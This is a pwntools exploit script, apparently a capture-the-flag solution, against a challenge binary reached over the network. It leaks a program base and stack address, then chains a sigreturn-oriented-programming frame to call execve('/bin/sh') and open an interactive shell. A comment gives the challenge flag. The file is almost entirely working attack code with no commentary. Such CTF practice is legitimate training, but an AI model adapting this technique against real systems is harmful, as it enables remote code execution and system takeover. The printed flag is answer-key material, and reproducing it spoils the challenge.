#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chall_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc challenges1.gcc-ctf.com 4004"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b __LOAD_SYS_READ
c
c
c
c
c
c
c
b *_read_and_print_str+34
c
c
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"200")
    sleep(0.5)
    r.sendline(b"a")
    r.recvuntil(b"to cut > ")
    r.recvline()

    data = r.recvline()
    data = r.recvline()
    leak = u64(data[-17:][:8])

    exe.address = leak - 0x0040

    SYSCALL = p64(0x0000000000001034+exe.address)
    __LOAD_SYS_READ = p64(exe.sym.__LOAD_SYS_READ)
    READ = p64(0x000000000000104d+exe.address) #xor rdi, rdi; mov rsi, rsp; mov edx, 0x512; syscall; 

    
    r.sendline(b"10000")
    sleep(0.5)
    r.sendline(b"a")
    r.recvuntil(b"to cut > a\n")
    data=r.recvline()
    data=r.recvline()
    stack_leak = u64(data[159:159+8].ljust(8, b"\x00"))
  
    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = stack_leak + 248 + 24 + 8
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rip = u64(SYSCALL)

    payload = p64(stack_leak) + b"A"*504 + p64(stack_leak) + __LOAD_SYS_READ + READ
    r.sendline(b"15")
    sleep(0.5)
    r.sendline(payload)
    sleep(0.5)

    payload = p64(stack_leak+16) + __LOAD_SYS_READ + READ + SYSCALL + bytes(frame) + b"/bin/sh\x00"
    r.sendline(payload)


    sleep(0.5)
    r.send(SYSCALL + bytes(frame)[:7])
   
    sleep(0.5)
    r.interactive()
    #GCC{SR0p_1s_f0r_Sup3r_R0P_Right?}

if __name__ == "__main__":
    main()